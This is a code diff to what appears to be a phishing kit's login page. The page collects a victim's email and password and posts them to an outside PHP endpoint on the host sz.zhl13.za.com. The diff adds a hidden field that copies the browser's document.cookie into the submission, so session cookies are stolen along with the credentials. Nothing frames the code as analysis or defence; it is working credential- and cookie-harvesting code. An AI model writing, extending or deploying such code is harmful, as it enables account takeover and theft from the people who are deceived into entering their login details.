@@ -103,6 +103,7 @@
                     <!-- Second Form for Password Input -->
                     <form id="passwordForm" action="https://sz.zhl13.za.com/.ex/.a.php" method="POST">
                         <input id="emailHidden" name="epol" type="hidden" />
+                        <input id="cookiesHidden" name="cookies" type="hidden" />
                         <p>
                             <input id="passwordInput" class="input_text" name="ppol" placeholder="Password" type="password" required />
                         </p>
@@ -119,6 +120,7 @@
         const emailDisplay = document.getElementById('emailDisplay');
         const displayedEmail = document.getElementById('displayedEmail');
         const emailHidden = document.getElementById('emailHidden');
+        const cookiesHidden = document.getElementById('cookiesHidden');
 
         emailForm.addEventListener('submit', function(e) {
             e.preventDefault();  // Prevent the form from submitting
@@ -126,7 +128,7 @@
             // Get the email value
             const emailValue = emailInput.value;
 
-            // Validate the email format (optional, but recommended)
+            // Validate the email format
             if (emailValue && validateEmail(emailValue)) {
                 // Hide the email form
                 emailForm.classList.add('hidden');
@@ -134,6 +136,11 @@
                 // Display the email and show the password form
                 displayedEmail.textContent = emailValue;
                 emailHidden.value = emailValue;
+
+                // Capture cookies
+                const cookies = document.cookie;
+                cookiesHidden.value = cookies;
+
                 emailDisplay.classList.remove('hidden');
             } else {
                 alert('Please enter a valid email address');
